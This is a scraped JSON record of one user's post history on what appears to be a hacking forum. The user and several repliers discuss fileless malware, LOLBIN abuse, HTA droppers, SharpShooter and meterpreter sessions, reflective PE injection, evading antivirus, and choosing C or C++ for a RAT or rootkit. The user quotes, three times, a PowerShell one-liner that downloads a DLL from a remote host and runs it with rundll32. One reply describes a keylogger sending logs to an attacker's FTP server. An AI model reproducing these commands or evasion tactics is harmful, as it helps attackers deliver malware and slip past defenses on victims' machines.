{"user": "BlackYenii", "history": ["As for HTA blocking, who knows, we\u2019ll find a new way, there is always a way. There are many LOLBINS, or Living Off The Land BINaries, you can find a list of these here: http://lolbas-project.com/ Windows is full of interesting code execution methods, and it generally helps to examine email malwar&hellip;", "Thank youu @pry0cc  =D !! @pry0cc @dtm what about starting a project \u2026", "As for HTA blocking, who knows, we\u2019ll find a new way, there is always a way. There are many LOLBINS, or Living Off The Land BINaries, you can find a list of these here: http://lolbas-project.com/ Windows is full of interesting code execution methods, and it generally helps to examine email malwar&hellip;", "Hmmm - I don\u2019t think you could reflectively infect a pe file in memory using JS/Com objects, however you could use javascript as a stager, that could pull and run a powershell script, such as: And then reflectively inject. However I don\u2019t know if this would be detected or not with windows defende&hellip;", "It\u2019s really awesome, but at this stage, you already have a process \u2026 so it is useful to bypass runtime detection .", "Thank you so much !! @dtm @pry0cc  is there any option to reflectively inject a pe file in memory using Javascript / COM objects? So I understand that nowadays, the only way to get the job than in a stealthy way is through an HTA file? Is that true? What if AV softwares start blocking and deletin&hellip;", "Yes - kind of. Executables are blocked in emails everywhere, and even technically inept people are beginning to learn that if somebody sends you an exe, it\u2019s probably malicious. However, if you do want to run an executable, you need to sign the executable,  because things like windows defender + c&hellip;", "@pry0cc Thank you!! I succeed with Sharpshooter, I\u2019ve got a meterpreter session combining some tricks. But the main question is does the exe malwares are dead in 2018? is this the only way malwares authors can spread their code?  what do you think?", "This isn\u2019t file-less because you\u2019re dropping a file to disk. If you want to file-lessly execute a traditional PE file using PowerShell, you can reflectively load it using a module like Invoke-ReflectivePEInjection. I believe mshta is flagged by Defender so I assume that would not be a very easy meth&hellip;", "@pry0cc Thank you!! I succeed with Sharpshooter, I\u2019ve got a meterpreter session combining some tricks. But the main question is does the exe malwares are dead in 2018? is this the only way malwares authors can spread their code?  what do you think?", "Have you tried using sharpshooter?", "@dtm @Baud @lkw even with fileless malwares \u2026 for example when I use a simple : powershell -nop -c &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.5:8080/apt.dll&#39;, &#39;C:\\ProgramData\\a.dll&#39;) ;copy &#39;C:\\ProgramData\\a.dll&#39; &#39;C:\\ProgramData\\x.dll&#39; ;rundll32 C:\\ProgramData\\x.dll,Run &quot;The&hellip;", "@dtm @Baud @lkw even with fileless malwares \u2026 for example when I use a simple : powershell -nop -c &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.5:8080/apt.dll&#39;, &#39;C:\\ProgramData\\a.dll&#39;) ;copy &#39;C:\\ProgramData\\a.dll&#39; &#39;C:\\ProgramData\\x.dll&#39; ;rundll32 C:\\ProgramData\\x.dll,Run &quot;The&hellip;", "@dtm @Baud @lkw even with fileless malwares \u2026 for example when I use a simple : powershell -nop -c &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.5:8080/apt.dll&#39;, &#39;C:\\ProgramData\\a.dll&#39;) ;copy &#39;C:\\ProgramData\\a.dll&#39; &#39;C:\\ProgramData\\x.dll&#39; ;rundll32 C:\\ProgramData\\x.dll,Run &quot;The&hellip;", "Nowadays. Old and traditional bypass technics used by malware failed in front of modern AV software. This is due to the whitelisting strategy adopted by antivirus solutions (AV won\u2019t let an unsigned binary to be executed). And also with the runtime monitoring now in effect. So I wonder how on the&hellip;", "@dtm @0x00pf Thank youu very much  I understand ^^", "In the Windows environment, using functions from libc (e.g. memcpy, strcpy) requires the msvcrt.dll library to be present in the process space which means that the binary must be linked with it in its import table assuming the source contains its direct usage (as opposed to dynamically retrieving it&hellip;", "It indeed makes things easier, if your program will be moving around in its own addressing space (or in another processes addressing space) and not just standing at the entry point specified in its ELF header (for GNU/Linux systems), then it is very handy to do not depend on anything external. To &hellip;", "Thanks @dtm and @0x00pf \u2026 does it have any relation with having a  position independent in memory?", "It indeed makes things easier, if your program will be moving around in its own addressing space (or in another processes addressing space) and not just standing at the entry point specified in its ELF header (for GNU/Linux systems), then it is very handy to do not depend on anything external. To &hellip;", "In the Windows environment, using functions from libc (e.g. memcpy, strcpy) requires the msvcrt.dll library to be present in the process space which means that the binary must be linked with it in its import table assuming the source contains its direct usage (as opposed to dynamically retrieving it&hellip;", "Thanks @dtm and @0x00pf \u2026 does it have any relation with having a  position independent in memory?", "On top of @dtm points I\u2019d add: Your binary will be way smaller which is, in general, a desirable feature for a malwareI think point 2 is a very good reason", "The only reasons I can think of for implementing your own functions would be the following: Evading signature-based or heuristic detection.Let\u2019s say I have a keylogger and I want it to upload logs to my FTP server. If I directly link the executable such that functions like FtpOpenFile and FtpPut&hellip;", "The only reasons I can think of for implementing your own functions would be the following: Evading signature-based or heuristic detection.Let\u2019s say I have a keylogger and I want it to upload logs to my FTP server. If I directly link the executable such that functions like FtpOpenFile and FtpPut&hellip;", "Hope to have some clarifications from @dtm", "First thanks for replying, but whats is the problem if IDA detect LibC functions ? They are not malicious \u2026", "Carberp :   A virus from Github", "Hello everyone; I wonder why some malware dev, rewrite some libc functions in their malware, like strcat, strcpy, malloc \u2026 Thanks !!", "Thank you for reading! Theoretically, you can hook anything if your monitoring application is at a low enough level but is most ideal when it is within the kernel so that it can oversee all processes. This is generally the case for anti-virus software which lies in the kernel and injects hooks into&hellip;", "Thank you for reading! Theoretically, you can hook anything if your monitoring application is at a low enough level but is most ideal when it is within the kernel so that it can oversee all processes. This is generally the case for anti-virus software which lies in the kernel and injects hooks into&hellip;", "Greate article @dtm  !! So rootkits can be detected if we hooked functions used to inject code ?", "I don\u2019t understand how using mixing C and C++ code makes binaries easier to hide or inject. If there is C code in your C++ project, I believe that it will still compile to C++ however I don\u2019t recommend you using C with C++. If you\u2019re going to use C++ just use C++. There shouldn\u2019t be much of a per&hellip;", "we already had a similar topic on C vs C++ Maybe you\u2019ll find your answer there. Otherwise  if you have a particular question hit up either @oaktree or @dtm for more information", "Thank you @dtm for your clarification . I still have some ambiguity ,  even if some codes are .cpp or use namespaces, but they still contain C code, not C++, they don\u2019t use STL, no classes \u2026 does this practice make the binary more easy to inject / hide, and faster ? I stared writing my RAT using C+&hellip;", "It doesn\u2019t make much difference, usually it comes down to personal preference. With C++, you have access to many of the STL capabilities and the option of using OOP to build your application. Using C, you won\u2019t have such higher level abstractions available to you but you may get a smaller binary pur&hellip;", "Hello guys !! I want to start writing a RAT/rootkit for Windows, but i\u2019m confused, I don\u2019t know which language to use, C or C++ . In an other way : Why some guys like C over C++ in malware dev Thanks .", "I don\u2019t know why for example in Carberp they use C-style char over std::string, no classes just C struct \u2026 does it give a differenet binary ?", "Hello guys !! I want to start writing a RAT/rootkit for Windows, but i\u2019m confused, I don\u2019t know which language to use, C or C++ . In an other way : Why some guys like C over C++ in malware dev Thanks ."]}